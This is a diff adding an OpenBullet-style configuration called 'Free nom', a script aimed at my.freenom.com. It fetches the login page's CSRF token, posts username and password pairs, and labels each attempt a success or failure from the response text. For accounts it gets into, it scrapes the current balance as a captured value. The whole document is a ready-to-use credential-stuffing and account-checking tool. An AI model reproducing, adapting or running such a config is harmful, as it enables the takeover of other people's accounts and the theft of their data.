@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "Free nom",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-11T23:00:45.375462-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://my.freenom.com/dologin.php" 
+  
+  HEADER "Host: my.freenom.com" 
+  HEADER "Origin: https://my.freenom.com" 
+  HEADER "Referer: https://my.freenom.com/clientarea.php?incorrect=true" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+PARSE "<SOURCE>" LR "\" name=\"token\" value=\"" "\" />" -> VAR "TOKEN" 
+
+REQUEST POST "https://my.freenom.com/dologin.php" 
+  CONTENT "token=<TOKEN>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: my.freenom.com" 
+  HEADER "Origin: https://my.freenom.com" 
+  HEADER "Referer: https://my.freenom.com/clientarea.php?incorrect=true" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "<span class=\"hidden-sm\">Hello " 
+
+REQUEST GET "https://my.freenom.com/clientarea.php?action=addfunds" 
+  
+  HEADER "Host: my.freenom.com" 
+  HEADER "Origin: https://my.freenom.com" 
+  HEADER "Referer: https://my.freenom.com/clientarea.php?incorrect=true" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+PARSE "<SOURCE>" LR "td class=\"textright\"><strong>Current Balance</strong></td>" "</td>" -> VAR "1" 
+
+FUNCTION Replace "<td>" "" "<1>" -> CAP "Balance" 
+
